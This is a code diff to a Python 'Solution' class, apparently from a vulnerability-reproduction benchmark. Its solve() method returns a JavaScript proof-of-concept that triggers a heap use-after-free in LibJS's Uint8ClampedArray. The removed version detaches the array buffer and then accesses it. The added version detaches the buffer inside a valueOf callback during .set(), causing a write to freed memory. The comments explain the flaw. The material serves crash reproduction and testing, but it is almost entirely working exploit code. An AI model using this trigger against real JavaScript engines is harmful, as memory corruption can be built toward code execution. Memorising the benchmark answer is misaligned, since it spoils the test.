@@ -1,60 +1,46 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The vulnerability is a Heap Use-After-Free in Uint8ClampedArray in LibJS.
-        # Uint8ClampedArray was implemented as a separate class and failed to properly
-        # handle ArrayBuffer detachment, unlike other TypedArrays.
-        # By creating a Uint8ClampedArray, detaching its buffer, and then accessing it,
-        # we can trigger the UAF.
-
-        poc = r"""
-try {
-    // 1. Setup the vulnerable object
-    var u8 = new Uint8ClampedArray(256);
-    var buf = u8.buffer;
-
-    // 2. Detach the underlying buffer
-    // In LibJS test environment (js shell), detachArrayBuffer is global.
-    var detached = false;
-    try {
-        if (typeof detachArrayBuffer === 'function') {
-            detachArrayBuffer(buf);
-            detached = true;
-        }
-    } catch (e) {}
-
-    if (!detached && typeof structuredClone === 'function') {
-        try {
-            structuredClone(buf, { transfer: [buf] });
-            detached = true;
-        } catch (e) {}
-    }
-
-    // 3. Trigger UAF
-    // If the implementation doesn't check for detachment, this accesses freed memory.
+        """
+        Generate a PoC that triggers the Heap Use After Free vulnerability in Uint8ClampedArray.
+        The vulnerability exists because Uint8ClampedArray was implemented separately from TypedArray
+        in older versions of LibJS, missing critical checks for buffer detachment in methods like .set().
+        """
+        poc_js = r"""
+function trigger() {
+    // Create a Uint8ClampedArray big enough to be on the heap
+    const u8 = new Uint8ClampedArray(1024);
     
-    // Write access
-    u8[0] = 0x41;
-    
-    // Read access
-    var x = u8[0];
-
-    // 4. Trigger UAF via iteration methods (map/filter)
-    // This targets loops that might cache the data pointer
-    var u8_loop = new Uint8ClampedArray(100);
-    u8_loop.fill(1);
-    u8_loop.map(function(val, idx) {
-        if (idx === 0) {
+    // Create an object that detaches the buffer when converted to a number
+    const evil = {
+        valueOf: function() {
+            // Attempt to detach the underlying ArrayBuffer
             try {
+                // Standard way in modern environments
+                structuredClone(u8.buffer, { transfer: [u8.buffer] });
+            } catch (e) {
+                // Fallback for some test shells
                 if (typeof detachArrayBuffer === 'function') {
-                    detachArrayBuffer(u8_loop.buffer);
+                    detachArrayBuffer(u8.buffer);
                 }
-            } catch(e) {}
+            }
+            // Return a value to be written to the array
+            return 0x41;
         }
-        return val;
-    });
+    };
 
-} catch (e) {
-    // Catch JS errors, we want the process to crash due to ASAN/Segmentation Fault
+    // Call .set(). This iterates over the input array.
+    // 1. Reads 'evil' from input array.
+    // 2. Converts 'evil' to number -> calls valueOf() -> detaches u8.buffer.
+    // 3. Writes result to u8's data pointer.
+    // In the vulnerable version, the data pointer is not re-verified after the callback,
+    // leading to a write to freed memory (Use-After-Free).
+    try {
+        u8.set([evil]);
+    } catch (e) {}
 }
+
+try {
+    trigger();
+} catch (e) {}
 """
-        return poc.encode('utf-8')
+        return poc_js.encode('utf-8')
